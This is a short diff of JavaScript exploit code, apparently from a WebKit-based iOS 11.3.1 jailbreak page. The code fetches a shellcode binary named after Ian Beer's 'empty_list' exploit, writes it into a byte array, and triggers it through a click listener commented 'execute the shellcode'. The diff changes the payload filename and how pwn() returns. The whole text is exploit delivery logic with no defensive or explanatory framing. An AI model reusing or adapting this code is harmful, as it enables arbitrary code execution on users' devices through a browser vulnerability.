@@ -424,7 +424,6 @@ var pwn = function() {
 
     if(verbosity >= VERBOSITY.DEFAULT) print('EmptyList is started, please close all background apps then dismiss this alert.');    
     wrapper.addEventListener('click', function(){}); //execute the shellcode
-    return true;
 };
 
 
@@ -453,7 +452,7 @@ function integrity_checks(buffer) {
 function wk113go() {
     
     //retrieve the shellcode containing the empty_list exploit by Ian Beer (Needs some work, doesn't check for request status code)
-    fetch('payloads/11_3_1/emptylist.bin').then((response) => {
+    fetch('payloads/11_3_1/emptylist_ACK.bin').then((response) => {
         response.arrayBuffer().then((buffer) => {
             try{
 
@@ -466,7 +465,7 @@ function wk113go() {
                 integrity_checks(buffer);
                 u8_buffer.set(new Uint8Array(buffer), 0x4000); //basically the same as what memset() and memcpy would do in c. uint8 is a char array containing our shellcode
                 if(verbosity === VERBOSITY.HIGH) print('Received '+shellcode_length+ ' bytes of shellcode. Exploit will start now.');
-                pwn();
+                return pwn();
             } catch(exception) {
                 alert(exception); //We do not want our script to fail, so we catch all exceptions if they occur and continue
             }
